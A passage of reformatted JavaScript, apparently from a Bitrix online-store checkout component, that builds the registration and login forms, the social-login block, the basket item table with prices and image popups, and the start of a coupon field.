                                return this.sendRequest("confirmSmsCode"), BX.PreventDefault(e)
                            }), this)
                        }
                    })]
                })), authFormNodes.push(BX.create("DIV", {
                    props: {className: "bx-authform-formgroup-container"},
                    children: [BX.create("DIV", {
                        props: {id: "bx_register_error"},
                        style: {display: "none"}
                    }), BX.create("DIV", {props: {id: "bx_register_resend"}})]
                }))) : (authFormNodes.push(BX.create("H3", {
                    props: {className: "bx-title"},
                    text: BX.message("STOF_REG_REQUEST")
                })), authFormNodes.push(this.createAuthFormInputContainer(BX.message("STOF_NAME"), BX.create("INPUT", {
                    attrs: {"data-next": "NEW_LAST_NAME"},
                    props: {name: "NEW_NAME", type: "text", size: 40, value: this.result.AUTH.NEW_NAME || ""},
                    events: {keypress: BX.proxy(this.checkKeyPress, this)}
                }), !0)), authFormNodes.push(this.createAuthFormInputContainer(BX.message("STOF_LASTNAME"), BX.create("INPUT", {
                    attrs: {"data-next": "NEW_EMAIL"},
                    props: {name: "NEW_LAST_NAME", type: "text", size: 40, value: this.result.AUTH.NEW_LAST_NAME || ""},
                    events: {keypress: BX.proxy(this.checkKeyPress, this)}
                }), !0)), authFormNodes.push(this.createAuthFormInputContainer(BX.message("STOF_EMAIL"), BX.create("INPUT", {
                    attrs: {"data-next": "PHONE_NUMBER"},
                    props: {name: "NEW_EMAIL", type: "text", size: 40, value: this.result.AUTH.NEW_EMAIL || ""},
                    events: {keypress: BX.proxy(this.checkKeyPress, this)}
                }), "Y" == this.result.AUTH.new_user_email_required)), "Y" === this.result.AUTH.new_user_phone_auth && authFormNodes.push(this.createAuthFormInputContainer(BX.message("STOF_PHONE"), BX.create("INPUT", {
                    attrs: {
                        "data-next": "captcha_word",
                        autocomplete: "tel"
                    },
                    props: {name: "PHONE_NUMBER", type: "text", size: 40, value: this.result.AUTH.PHONE_NUMBER || ""},
                    events: {keypress: BX.proxy(this.checkKeyPress, this)}
                }), "Y" === this.result.AUTH.new_user_phone_required)), this.authGenerateUser && (authFormNodes.push(BX.create("LABEL", {
                    props: {for: "NEW_GENERATE_N"},
                    children: [BX.create("INPUT", {
                        attrs: {checked: !this.authGenerateUser},
                        props: {id: "NEW_GENERATE_N", type: "radio", name: "NEW_GENERATE", value: "N"}
                    }), BX.message("STOF_MY_PASSWORD")],
                    events: {
                        change: BX.delegate((function () {
                            var generated;
                            this.authBlockNode.querySelector(".generated").style.display = "", this.authGenerateUser = !1
                        }), this)
                    }
                })), authFormNodes.push(BX.create("BR")), authFormNodes.push(BX.create("LABEL", {
                    props: {for: "NEW_GENERATE_Y"},
                    children: [BX.create("INPUT", {
                        attrs: {checked: this.authGenerateUser},
                        props: {id: "NEW_GENERATE_Y", type: "radio", name: "NEW_GENERATE", value: "Y"}
                    }), BX.message("STOF_SYS_PASSWORD")],
                    events: {
                        change: BX.delegate((function () {
                            var generated;
                            this.authBlockNode.querySelector(".generated").style.display = "none", this.authGenerateUser = !0
                        }), this)
                    }
                }))), authFormNodes.push(BX.create("DIV", {
                    props: {className: "generated"},
                    style: {display: this.authGenerateUser ? "none" : ""},
                    children: [this.createAuthFormInputContainer(BX.message("STOF_LOGIN"), BX.create("INPUT", {
                        props: {
                            name: "NEW_LOGIN",
                            type: "text",
                            size: 30,
                            value: this.result.AUTH.NEW_LOGIN || ""
                        }, events: {keypress: BX.proxy(this.checkKeyPress, this)}
                    }), !0), this.createAuthFormInputContainer(BX.message("STOF_PASSWORD"), BX.create("INPUT", {
                        props: {
                            name: "NEW_PASSWORD",
                            type: "password",
                            size: 30
                        }, events: {keypress: BX.proxy(this.checkKeyPress, this)}
                    }), !0), this.createAuthFormInputContainer(BX.message("STOF_RE_PASSWORD"), BX.create("INPUT", {
                        props: {
                            name: "NEW_PASSWORD_CONFIRM",
                            type: "password",
                            size: 30
                        }, events: {keypress: BX.proxy(this.checkKeyPress, this)}
                    }), !0)]
                })), "Y" == this.result.AUTH.captcha_registration && authFormNodes.push(BX.create("DIV", {
                    props: {className: "bx-authform-formgroup-container"},
                    children: [BX.create("DIV", {
                        props: {className: "bx-authform-label-container"},
                        children: [BX.create("SPAN", {
                            props: {className: "bx-authform-starrequired"},
                            text: "*"
                        }), BX.message("CAPTCHA_REGF_PROMT"), BX.create("DIV", {
                            props: {className: "bx-captcha"},
                            children: [BX.create("INPUT", {
                                props: {
                                    name: "captcha_sid",
                                    type: "hidden",
                                    value: this.result.AUTH.capCode || ""
                                }
                            }), BX.create("IMG", {
                                props: {
                                    src: "/bitrix/tools/captcha.php?captcha_sid=" + this.result.AUTH.capCode,
                                    alt: ""
                                }
                            })]
                        })]
                    }), BX.create("DIV", {
                        props: {className: "bx-authform-input-container"},
                        children: [BX.create("INPUT", {
                            attrs: {"data-send": !0},
                            props: {name: "captcha_word", type: "text", size: "30", maxlength: "50", value: ""},
                            events: {keypress: BX.proxy(this.checkKeyPress, this)}
                        })]
                    })]
                })), authFormNodes.push(BX.create("DIV", {
                    props: {className: "bx-authform-formgroup-container"},
                    children: [BX.create("INPUT", {
                        props: {
                            id: "do_register",
                            name: "do_register",
                            type: "hidden",
                            value: "N"
                        }
                    }), BX.create("INPUT", {
                        props: {
                            type: "submit",
                            className: "btn btn-lg btn-default",
                            value: BX.message("STOF_REGISTER")
                        }, events: {
                            click: BX.delegate((function (e) {
                                var email = BX.findChild(BX("bx-soa-auth"), {attribute: {name: "NEW_EMAIL"}}, !0, !1),
                                    login = BX.findChild(BX("bx-soa-auth"), {attribute: {name: "NEW_LOGIN"}}, !0, !1);
                                return "Y" === arMaxOptions.THEME.LOGIN_EQUAL_EMAIL && login && email && (login.value = email.value), BX("do_register").value = "Y", this.sendRequest("showAuthForm"), BX.PreventDefault(e)
                            }), this)
                        }
                    }), BX.create("A", {
                        props: {className: "btn btn-lg btn-link", href: ""},
                        text: BX.message("STOF_DO_AUTHORIZE"),
                        events: {
                            click: BX.delegate((function (e) {
                                return this.toggleAuthForm(e), BX.PreventDefault(e)
                            }), this)
                        }
                    })]
                }))), authContent.appendChild(BX.create("DIV", {
                    props: {className: "col-md-12"},
                    children: [BX.create("DIV", {props: {className: "bx-authform"}, children: authFormNodes})]
                })), showSmsConfirm && this.activatePhoneAuth()
            }
        }, editSocialContent: function (authContent) {
            if (BX("bx-soa-soc-auth-services")) {
                var nodes = [];
                if (!1 === this.socServiceHiddenNode) {
                    var socServiceHiddenNode = BX("bx-soa-soc-auth-services").querySelector(".bx-authform-social");
                    BX.type.isDomNode(socServiceHiddenNode) && (this.socServiceHiddenNode = socServiceHiddenNode.innerHTML, BX.remove(socServiceHiddenNode))
                }
                this.socServiceHiddenNode && (nodes.push(BX.create("DIV", {
                    props: {className: "bx-authform-social"},
                    html: '<h3 class="bx-title">' + BX.message("SOA_DO_SOC_SERV") + "</h3>" + this.socServiceHiddenNode
                })), nodes.push(BX.create("hr", {props: {className: "bxe-light"}}))), "Y" === this.result.AUTH.new_user_registration && nodes.push(BX.create("DIV", {
                    props: {className: "bx-soa-reg-block"},
                    children: [BX.create("P", {html: this.params.MESS_REGISTRATION_REFERENCE}), BX.create("A", {
                        props: {className: "btn btn-default btn-lg"},
                        text: BX.message("STOF_DO_REGISTER"),
                        events: {
                            click: BX.delegate((function (e) {
                                return this.toggleAuthForm(e), BX.PreventDefault(e)
                            }), this)
                        }
                    })]
                })), authContent.appendChild(BX.create("DIV", {props: {className: "col-md-6"}, children: nodes}))
            }
        }, getAuthReference: function (authContent) {
            authContent.appendChild(BX.create("DIV", {
                props: {className: "row"},
                children: [BX.create("DIV", {
                    props: {className: "bx-soa-reference col-xs-12"},
                    children: [this.params.MESS_AUTH_REFERENCE_1, BX.create("BR"), this.params.MESS_AUTH_REFERENCE_2, BX.create("BR"), this.params.MESS_AUTH_REFERENCE_3]
                })]
            }))
        }, toggleAuthForm: function (event) {
            if (event) {
                var target = event.target || event.srcElement,
                    section = BX.findParent(target, {className: "bx-soa-section"}),
                    container = BX.findParent(target, {className: "bx-soa-section-content"}),
                    insertContainer = BX.firstChild(this.authHiddenBlockNode);
                new BX.easing({
                    duration: 100,
                    start: {opacity: 100},
                    finish: {opacity: 0},
                    transition: BX.easing.makeEaseOut(BX.easing.transitions.quad),
                    step: function (state) {
                        container.style.opacity = state.opacity / 100
                    }
                }).animate(), this.authHiddenBlockNode.appendChild(container), BX.cleanNode(section), section.appendChild(BX.create("DIV", {
                    props: {className: "bx-soa-section-title-container"},
                    children: [BX.create("h2", {
                        props: {className: "bx-soa-section-title col-xs-7 col-sm-9"},
                        html: BX.hasClass(insertContainer, "reg") ? this.params.MESS_REG_BLOCK_NAME : this.params.MESS_AUTH_BLOCK_NAME
                    })]
                })), insertContainer.style.opacity = 0, section.appendChild(insertContainer), setTimeout((function () {
                    new BX.easing({
                        duration: 100,
                        start: {opacity: 0},
                        finish: {opacity: 100},
                        transition: BX.easing.makeEaseOut(BX.easing.transitions.quart),
                        step: function (state) {
                            insertContainer.style.opacity = state.opacity / 100
                        },
                        complete: function () {
                            insertContainer.style.height = "", insertContainer.style.opacity = ""
                        }
                    }).animate()
                }), 110), this.animateScrollTo(section)
            }
        }, alignBasketColumns: function () {
            var i, k, columns, columnNodes, windowSize, basketRows, percent
        }, editBasketBlock: function (active) {
            this.basketBlockNode && this.basketHiddenBlockNode && this.result.GRID && (BX.remove(BX.lastChild(this.basketBlockNode)), BX.remove(BX.lastChild(this.basketHiddenBlockNode)), this.editActiveBasketBlock(active), this.editFadeBasketBlock(active), this.initialized.basket = !0)
        }, editActiveBasketBlock: function (activeNodeMode) {
            var node = activeNodeMode ? this.basketBlockNode : this.basketHiddenBlockNode, basketContent, basketTable;
            this.initialized.basket ? (this.basketHiddenBlockNode.appendChild(BX.lastChild(node)), node.appendChild(BX.firstChild(this.basketHiddenBlockNode))) : (basketContent = node.querySelector(".bx-soa-section-content"), basketTable = BX.create("TABLE", {props: {className: "bx-soa-item-table"}}), basketContent ? BX.cleanNode(basketContent) : (basketContent = this.getNewContainer(), node.appendChild(basketContent)), this.editBasketItems(basketTable, !0), basketContent.appendChild(BX.create("DIV", {
                props: {className: "bx-soa-table-fade"},
                children: [BX.create("DIV", {style: {overflowX: "auto", overflowY: "hidden"}, children: [basketTable]})]
            })), "Y" === this.params.SHOW_COUPONS_BASKET && this.editCoupons(basketContent), this.getBlockFooter(basketContent), BX.bind(basketContent.querySelector("div.bx-soa-table-fade").firstChild, "scroll", BX.proxy(this.basketBlockScrollCheckEvent, this))), this.alignBasketColumns()
        }, editFadeBasketBlock: function (activeNodeMode) {
            var node = activeNodeMode ? this.basketHiddenBlockNode : this.basketBlockNode, newContent, basketTable;
            this.initialized.basket || (newContent = this.getNewContainer(), basketTable = BX.create("TABLE", {props: {className: "bx-soa-item-table"}}), this.editBasketItems(basketTable, !1), newContent.appendChild(BX.create("DIV", {
                props: {className: "bx-soa-table-fade"},
                children: [BX.create("DIV", {style: {overflowX: "auto", overflowY: "hidden"}, children: [basketTable]})]
            })), "Y" === this.params.SHOW_COUPONS_BASKET && this.editCoupons(newContent), node.appendChild(newContent), this.alignBasketColumns(), this.basketBlockScrollCheck(), BX.bind(this.basketBlockNode.querySelector("div.bx-soa-table-fade").firstChild, "scroll", BX.proxy(this.basketBlockScrollCheckEvent, this))), this.alignBasketColumns()
        }, editBasketItems: function (basketItemsNode, active) {
            if (this.result.GRID.ROWS) {
                var index = 0, i;
                for (i in "Y" === this.params.SHOW_BASKET_HEADERS && this.editBasketItemsHeader(basketItemsNode), this.result.GRID.ROWS) this.result.GRID.ROWS.hasOwnProperty(i) && this.createBasketItem(basketItemsNode, this.result.GRID.ROWS[i], index++, !!active)
            }
        }, editBasketItemsHeader: function (basketItemsNode) {
            if (basketItemsNode) {
                var headers = [BX.create("TD", {
                    props: {className: "bx-soa-item-td"},
                    style: {paddingBottom: "5px"},
                    children: [BX.create("DIV", {
                        props: {className: "bx-soa-item-td-title"},
                        text: BX.message("SOA_SUM_NAME")
                    })]
                })], toRight = !1, column, basketColumnIndex = 0, i;
                for (i = 0; i < this.result.GRID.HEADERS.length; i++) "NAME" !== (column = this.result.GRID.HEADERS[i]).id && "PREVIEW_PICTURE" !== column.id && "PROPS" !== column.id && "NOTES" !== column.id && ("DETAIL_PICTURE" !== column.id || this.options.showPreviewPicInBasket) && (toRight = BX.util.in_array(column.id, ["QUANTITY", "PRICE_FORMATED", "DISCOUNT_PRICE_PERCENT_FORMATED", "SUM"]), headers.push(BX.create("TD", {
                    props: {className: "bx-soa-item-td bx-soa-item-properties" + (toRight ? " bx-text-right" : "")},
                    style: {paddingBottom: "5px"},
                    children: [BX.create("DIV", {props: {className: "bx-soa-item-td-title"}, text: column.name})]
                })), 4 == ++basketColumnIndex && this.result.GRID.HEADERS[i + 1] && (headers.push(BX.create("DIV", {props: {className: "bx-soa-item-nth-4p1"}})), basketColumnIndex = 0));
                basketItemsNode.appendChild(BX.create("TR", {
                    props: {className: "bx-soa-item-tr hidden-sm hidden-xs"},
                    children: headers
                }))
            }
        }, createBasketItem: function (basketItemsNode, item, index, active) {
            var mainColumns = [], otherColumns = [], hiddenColumns = [], currentColumn, basketColumnIndex = 0, i, tr,
                cols, dopColCount = 0, countCols = 0;
            for ((this.options.showPreviewPicInBasket || this.options.showDetailPicInBasket) && mainColumns.push(this.createBasketItemImg(item.data)), mainColumns.push(this.createBasketItemContent(item.data)), i = 0; i < this.result.GRID.HEADERS.length; i++) "NAME" !== (currentColumn = this.result.GRID.HEADERS[i]).id && "PREVIEW_PICTURE" !== currentColumn.id && "PROPS" !== currentColumn.id && "NOTES" !== currentColumn.id && ("DETAIL_PICTURE" !== currentColumn.id || this.options.showPreviewPicInBasket) && (otherColumns.push(this.createBasketItemColumn(currentColumn, item, active)), 4 == ++basketColumnIndex && this.result.GRID.HEADERS[i + 1] && (otherColumns.push(BX.create("DIV", {props: {className: "bx-soa-item-nth-4p1"}})), basketColumnIndex = 0, dopColCount++), countCols++);
            if (active) for (i = 0; i < this.result.GRID.HEADERS_HIDDEN.length; i++) tr = this.createBasketItemHiddenColumn(this.result.GRID.HEADERS_HIDDEN[i], item), BX.type.isArray(tr) ? hiddenColumns = hiddenColumns.concat(tr) : tr && hiddenColumns.push(tr);
            cols = [BX.create("TD", {
                props: {className: "bx-soa-item-td"},
                style: {minWidth: "300px"},
                children: [BX.create("DIV", {props: {className: "bx-soa-item-block"}, children: mainColumns})]
            })].concat(otherColumns);
            var dopClassServices = "",
                withServices = void 0 !== item.data.LINK_SERVICES && item.data.LINK_SERVICES.constructor === Object;
            "Y" === item.data.IS_SERVICES && (dopClassServices += " hidden_order_services "), withServices && (dopClassServices += " w_order_services "), basketItemsNode.appendChild(BX.create("TR", {
                props: {className: "bx-soa-item-tr bx-soa-basket-info" + dopClassServices + (0 == index ? " bx-soa-item-tr-first" : "")},
                children: cols
            }));
            var servicesItems = [];
            countCols = dopColCount + countCols + 1, withServices && ((servicesItems = this.createServicesBasketItem(item, countCols)).forEach((function (elem, i, arr) {
                basketItemsNode.append(elem)
            })), basketItemsNode.appendChild(BX.create("TR", {
                props: {className: "services-item-tr-padding"},
                children: [BX.create("TD", {
                    props: {className: "services-item-td-padding"},
                    attrs: {colspan: countCols},
                    text: ""
                })]
            }))), hiddenColumns.length && basketItemsNode.appendChild(BX.create("TR", {
                props: {className: "bx-soa-item-tr bx-soa-item-info-container" + dopClassServices},
                children: [BX.create("TD", {
                    props: {className: "bx-soa-item-td"},
                    attrs: {colspan: countCols},
                    children: [BX.create("A", {
                        props: {href: "", className: "bx-soa-info-shower"},
                        html: this.params.MESS_ADDITIONAL_PROPS,
                        events: {click: BX.proxy(this.showAdditionalProperties, this)}
                    }), BX.create("DIV", {
                        props: {className: "bx-soa-item-info-block"},
                        children: [BX.create("TABLE", {
                            props: {className: "bx-soa-info-block"},
                            children: hiddenColumns
                        })]
                    })]
                })]
            }))
        }, showAdditionalProperties: function (event) {
            var target = event.target || event.srcElement, infoContainer = target.nextSibling,
                parentContainer = BX.findParent(target, {className: "bx-soa-item-tr bx-soa-item-info-container"}),
                parentHeight = parentContainer.offsetHeight;
            if (BX.hasClass(infoContainer, "bx-active")) new BX.easing({
                duration: 300,
                start: {opacity: 100, height: parentHeight},
                finish: {opacity: 0, height: 35},
                transition: BX.easing.makeEaseOut(BX.easing.transitions.quad),
                step: function (state) {
                    infoContainer.style.opacity = state.opacity / 100, infoContainer.style.height = state.height + "px", parentContainer.style.height = state.height + "px"
                },
                complete: function () {
                    BX.removeClass(infoContainer, "bx-active"), infoContainer.removeAttribute("style"), parentContainer.removeAttribute("style")
                }
            }).animate(); else {
                infoContainer.style.opacity = 0, BX.addClass(infoContainer, "bx-active");
                var height = infoContainer.offsetHeight + parentHeight;
                BX.removeClass(infoContainer, "bx-active"), infoContainer.style.paddingTop = "10px", new BX.easing({
                    duration: 300,
                    start: {opacity: 0, height: parentHeight},
                    finish: {opacity: 100, height: height},
                    transition: BX.easing.makeEaseOut(BX.easing.transitions.quad),
                    step: function (state) {
                        infoContainer.style.opacity = state.opacity / 100, infoContainer.style.height = state.height + "px", parentContainer.style.height = state.height + "px"
                    },
                    complete: function () {
                        BX.addClass(infoContainer, "bx-active"), infoContainer.removeAttribute("style")
                    }
                }).animate()
            }
            return BX.PreventDefault(event)
        }, createBasketItemImg: function (data) {
            var logoNode, logotype;
            if (data) return logoNode = BX.create("DIV", {props: {className: "bx-soa-item-imgcontainer"}}), data.PREVIEW_PICTURE_SRC && data.PREVIEW_PICTURE_SRC.length ? logotype = this.getImageSources(data, "PREVIEW_PICTURE") : data.DETAIL_PICTURE_SRC && data.DETAIL_PICTURE_SRC.length && (logotype = this.getImageSources(data, "DETAIL_PICTURE")), logotype && logotype.src_2x ? logoNode.setAttribute("style", "background-image: url(" + logotype.src_1x + ");background-image: -webkit-image-set(url(" + logotype.src_1x + ") 1x, url(" + logotype.src_2x + ") 2x)") : (logotype = logotype && logotype.src_1x || this.defaultBasketItemLogo, logoNode.setAttribute("style", "background-image: url(" + logotype + ");")), "Y" !== this.params.HIDE_DETAIL_PAGE_URL && data.DETAIL_PAGE_URL && data.DETAIL_PAGE_URL.length && (logoNode = BX.create("A", {
                props: {href: data.DETAIL_PAGE_URL},
                children: [logoNode]
            })), BX.create("DIV", {props: {className: "bx-soa-item-img-block"}, children: [logoNode]})
        }, createBasketItemContent: function (data) {
            var itemName = data.NAME || "", titleHtml = this.htmlspecialcharsEx(itemName), props = data.PROPS || [],
                propsNodes = [];
            if ("Y" !== this.params.HIDE_DETAIL_PAGE_URL && data.DETAIL_PAGE_URL && data.DETAIL_PAGE_URL.length && (titleHtml = '<a href="' + data.DETAIL_PAGE_URL + '">' + titleHtml + "</a>"), this.options.showPropsInBasket && props.length) for (var i in props) if (props.hasOwnProperty(i)) {
                var name = props[i].NAME || "", value = props[i].VALUE || "";
                propsNodes.push(BX.create("DIV", {
                    props: {className: "bx-soa-item-td-title"},
                    style: {textAlign: "left"},
                    text: name
                })), propsNodes.push(BX.create("DIV", {
                    props: {className: "bx-soa-item-td-text"},
                    style: {textAlign: "left"},
                    text: value
                }))
            }
            return BX.create("DIV", {
                props: {className: "bx-soa-item-content"},
                children: propsNodes.length ? [BX.create("DIV", {
                    props: {className: "bx-soa-item-title"},
                    html: titleHtml
                }), BX.create("DIV", {
                    props: {className: "bx-scu-container"},
                    children: propsNodes
                })] : [BX.create("DIV", {props: {className: "bx-soa-item-title"}, html: titleHtml})]
            })
        }, createServicesBasketItem: function (item, countCols) {
            var servicesInfo = item.data.LINK_SERVICES, arrServicesDiv = [],
                classImgPadding = this.options.showPreviewPicInBasket || this.options.showDetailPicInBasket ? " need_img_padding " : "";
            for (var key in servicesInfo) {
                var infoHtml = [BX.create("SPAN", {
                    props: {className: "services_order_item_title"},
                    html: servicesInfo[key].NAME
                }), BX.create("SPAN", {
                    props: {className: "services_order_item_x"},
                    html: " x "
                }), BX.create("SPAN", {
                    props: {className: "services_order_item_quantity"},
                    html: servicesInfo[key].QUANTITY + "&nbsp;" + servicesInfo[key].MEASURE_TEXT
                })], priceHtml = [BX.create("SPAN", {
                    props: {className: "price font-bold"},
                    html: servicesInfo[key].SUM_FORMATED
                })];
                "Y" === servicesInfo[key].NEED_SHOW_OLD_SUM && priceHtml.push(BX.create("SPAN", {
                    props: {className: "price_discount"},
                    html: servicesInfo[key].SUM_BASE_FORMATED
                })), arrServicesDiv.push(BX.create("TR", {
                    props: {className: "services_order_item " + classImgPadding},
                    children: [BX.create("TD", {
                        props: {className: "services_order_item_info"},
                        attrs: {colspan: countCols - 1},
                        children: [BX.create("DIV", {
                            props: {className: "services_order_item_info_inner"},
                            children: infoHtml
                        })]
                    }), BX.create("TD", {props: {className: "services_order_item_price"}, children: priceHtml})]
                }))
            }
            return arrServicesDiv
        }, createBasketItemColumn: function (column, allData, active) {
            if (column && allData) {
                var data = allData.columns[column.id] ? allData.columns : allData.data,
                    toRight = BX.util.in_array(column.id, ["QUANTITY", "PRICE_FORMATED", "DISCOUNT_PRICE_PERCENT_FORMATED", "SUM"]),
                    textNode = BX.create("DIV", {props: {className: "bx-soa-item-td-text"}}), logotype, img;
                if ("PRICE_FORMATED" === column.id) textNode.appendChild(BX.create("STRONG", {
                    props: {className: "bx-price"},
                    html: data.PRICE_FORMATED
                })), parseFloat(data.DISCOUNT_PRICE) > 0 && (textNode.appendChild(BX.create("BR")), textNode.appendChild(BX.create("STRONG", {
                    props: {className: "bx-price-old"},
                    html: data.BASE_PRICE_FORMATED
                }))), this.options.showPriceNotesInBasket && active && (textNode.appendChild(BX.create("BR")), textNode.appendChild(BX.create("SMALL", {text: data.NOTES}))); else if ("SUM" === column.id) textNode.appendChild(BX.create("STRONG", {
                    props: {className: "bx-price all"},
                    html: data.SUM
                })), parseFloat(data.DISCOUNT_PRICE) > 0 && (textNode.appendChild(BX.create("BR")), textNode.appendChild(BX.create("STRONG", {
                    props: {className: "bx-price-old"},
                    html: data.SUM_BASE_FORMATED
                }))); else if ("DISCOUNT" === column.id) textNode.appendChild(BX.create("STRONG", {
                    props: {className: "bx-price"},
                    text: data.DISCOUNT_PRICE_PERCENT_FORMATED
                })); else if ("DETAIL_PICTURE" === column.id) logotype = this.getImageSources(allData.data, column.id), img = BX.create("IMG", {props: {src: logotype && logotype.src_1x || this.defaultBasketItemLogo}}), logotype && logotype.src_1x && logotype.src_orig && BX.bind(img, "click", BX.delegate((function (e) {
                    this.popupShow(e, logotype.src_orig)
                }), this)), textNode.appendChild(img); else if (BX.util.in_array(column.id, ["QUANTITY", "WEIGHT_FORMATED", "DISCOUNT_PRICE_PERCENT_FORMATED"])) textNode.appendChild(BX.create("SPAN", {html: data[column.id]})); else if ("PREVIEW_TEXT" === column.id) "html" === data.PREVIEW_TEXT_TYPE ? textNode.appendChild(BX.create("SPAN", {html: data.PREVIEW_TEXT || ""})) : textNode.appendChild(BX.create("SPAN", {text: data.PREVIEW_TEXT || ""})); else {
                    var columnData = data[column.id], val = [];
                    if (BX.type.isArray(columnData)) {
                        for (var i in columnData) columnData.hasOwnProperty(i) && ("image" == columnData[i].type ? val.push(this.getImageContainer(columnData[i].value, columnData[i].source)) : "linked" == columnData[i].type ? (textNode.appendChild(BX.create("SPAN", {html: columnData[i].value_format})), textNode.appendChild(BX.create("BR"))) : columnData[i].value && (textNode.appendChild(BX.create("SPAN", {html: columnData[i].value})), textNode.appendChild(BX.create("BR"))));
                        val.length && textNode.appendChild(BX.create("DIV", {
                            props: {className: "bx-scu-list"},
                            children: [BX.create("UL", {props: {className: "bx-scu-itemlist"}, children: val})]
                        }))
                    } else columnData && textNode.appendChild(BX.create("SPAN", {html: BX.util.htmlspecialchars(columnData)}))
                }
                return BX.create("TD", {
                    props: {className: "bx-soa-item-td bx-soa-item-properties" + (toRight ? " bx-text-right" : "")},
                    children: [BX.create("DIV", {
                        props: {className: "bx-soa-item-td-title visible-xs visible-sm"},
                        text: column.name
                    }), textNode]
                })
            }
        }, createBasketItemHiddenColumn: function (column, allData) {
            if (column && allData) {
                var data = allData.columns[column.id] ? allData.columns : allData.data,
                    textNode = BX.create("TD", {props: {className: "bx-soa-info-text"}}), logotype, img, i;
                if ("PROPS" !== column.id) {
                    if ("PRICE_FORMATED" === column.id) textNode.appendChild(BX.create("STRONG", {
                        props: {className: "bx-price"},
                        html: data.PRICE_FORMATED
                    })), parseFloat(data.DISCOUNT_PRICE) > 0 && (textNode.appendChild(BX.create("BR")), textNode.appendChild(BX.create("STRONG", {
                        props: {className: "bx-price-old"},
                        html: data.BASE_PRICE_FORMATED
                    }))); else if ("SUM" === column.id) textNode.appendChild(BX.create("STRONG", {
                        props: {className: "bx-price all"},
                        text: data.SUM
                    })); else if ("DISCOUNT" === column.id) textNode.appendChild(BX.create("STRONG", {
                        props: {className: "bx-price"},
                        text: data.DISCOUNT_PRICE_PERCENT_FORMATED
                    })); else if ("DETAIL_PICTURE" === column.id || "PREVIEW_PICTURE" === column.id) logotype = this.getImageSources(allData.data, column.id), img = BX.create("IMG", {
                        props: {src: logotype && logotype.src_1x || this.defaultBasketItemLogo},
                        style: {maxWidth: "50%"}
                    }), logotype && logotype.src_1x && logotype.src_orig && BX.bind(img, "click", BX.delegate((function (e) {
                        this.popupShow(e, logotype.src_orig)
                    }), this)), textNode.appendChild(img); else if (BX.util.in_array(column.id, ["QUANTITY", "WEIGHT_FORMATED", "DISCOUNT_PRICE_PERCENT_FORMATED"])) textNode.appendChild(BX.create("SPAN", {html: data[column.id]})); else if ("PREVIEW_TEXT" === column.id) "html" === data.PREVIEW_TEXT_TYPE ? textNode.appendChild(BX.create("SPAN", {html: data.PREVIEW_TEXT || ""})) : textNode.appendChild(BX.create("SPAN", {text: data.PREVIEW_TEXT || ""})); else {
                        var columnData = data[column.id], val = [];
                        if (BX.type.isArray(columnData)) {
                            for (i in columnData) if (columnData.hasOwnProperty(i)) if ("image" == columnData[i].type) val.push(this.getImageContainer(columnData[i].value, columnData[i].source)); else if ("linked" == columnData[i].type) textNode.appendChild(BX.create("SPAN", {html: columnData[i].value_format})), textNode.appendChild(BX.create("BR")); else {
                                if (!columnData[i].value) return;
                                textNode.appendChild(BX.create("SPAN", {html: columnData[i].value})), textNode.appendChild(BX.create("BR"))
                            }
                            val.length && textNode.appendChild(BX.create("DIV", {
                                props: {className: "bx-scu-list"},
                                children: [BX.create("UL", {props: {className: "bx-scu-itemlist"}, children: val})]
                            }))
                        } else {
                            if (!columnData) return;
                            textNode.appendChild(BX.create("SPAN", {html: BX.util.htmlspecialchars(columnData)}))
                        }
                    }
                    return BX.create("TR", {
                        props: {className: "bx-soa-info-line"},
                        children: [BX.create("TD", {
                            props: {className: "bx-soa-info-title"},
                            text: column.name + ":"
                        }), textNode]
                    })
                }
                var propsNodes = [], props = allData.data.PROPS;
                if (props && props.length) {
                    for (i in props) if (props.hasOwnProperty(i)) {
                        var name = props[i].NAME || "", value = props[i].VALUE || "";
                        if (0 == value.length) continue;
                        propsNodes.push(BX.create("TR", {
                            props: {className: "bx-soa-info-line"},
                            children: [BX.create("TD", {
                                props: {className: "bx-soa-info-title"},
                                text: name + ":"
                            }), BX.create("TD", {
                                props: {className: "bx-soa-info-text"},
                                html: BX.util.htmlspecialchars(value)
                            })]
                        }))
                    }
                    return propsNodes
                }
            }
        }, popupShow: function (e, url, source) {
            this.popup && this.popup.destroy();
            var that = this;
            this.popup = new BX.PopupWindow("bx-soa-image-popup", null, {
                lightShadow: !0,
                offsetTop: 0,
                offsetLeft: 0,
                closeIcon: {top: "3px", right: "10px"},
                autoHide: !0,
                bindOptions: {position: "bottom"},
                closeByEsc: !0,
                zIndex: 100,
                events: {
                    onPopupShow: function () {
                        BX.create("IMG", {
                            props: {src: source || url}, events: {
                                load: function () {
                                    var content = BX("bx-soa-image-popup-content");
                                    if (content) {
                                        var windowSize = BX.GetWindowInnerSize(), ratio = this.isMobile ? .5 : .9,
                                            contentHeight, contentWidth;
                                        BX.cleanNode(content), content.appendChild(this), contentHeight = content.offsetHeight, contentWidth = content.offsetWidth, contentHeight > windowSize.innerHeight * ratio && (content.style.height = windowSize.innerHeight * ratio + "px", content.style.width = contentWidth * (windowSize.innerHeight * ratio / contentHeight) + "px", contentHeight = content.offsetHeight, contentWidth = content.offsetWidth), contentWidth > windowSize.innerWidth * ratio && (content.style.width = windowSize.innerWidth * ratio + "px", content.style.height = contentHeight * (windowSize.innerWidth * ratio / contentWidth) + "px"), content.style.height = content.offsetHeight + "px", content.style.width = content.offsetWidth + "px", that.popup.adjustPosition()
                                    }
                                }
                            }
                        })
                    }, onPopupClose: function () {
                        this.destroy()
                    }
                },
                content: BX.create("DIV", {
                    props: {id: "bx-soa-image-popup-content"},
                    children: [BX.create("IMG", {props: {src: this.templateFolder + "/images/loader.gif"}})]
                })
            }), this.popup.show()
        }, getImageContainer: function (link, source) {
            return BX.create("LI", {
                props: {className: "bx-img-item"},
                children: [BX.create("DIV", {
                    props: {className: "bx-scu-itemColorBlock"},
                    children: [BX.create("DIV", {
                        props: {className: "bx-img-itemColor"},
                        style: {backgroundImage: "url(" + link + ")"}
                    })],
                    events: {
                        click: BX.delegate((function (e) {
                            this.popupShow(e, link, source)
                        }), this)
                    }
                })]
            })
        }, editCoupons: function (basketItemsNode) {
            var couponsList = this.getCouponsList(!0), couponsLabel = this.getCouponsLabel(!0),
                couponsBlock = BX.create("DIV", {
                    props: {className: "bx-soa-coupon-block"},
                    children: [BX.create("DIV", {
                        props: {className: "bx-soa-coupon-input"},
                        children: [BX.create("INPUT", {
                            props: {
                                className: "form-control bx-ios-fix",
                                type: "text",
                                placeholder: BX.message("ORDER_PROMOCODE_TITLE")
                            }, events: {
                                change: BX.delegate((function (event) {
                                    var newCoupon = BX.getEventTarget(event);
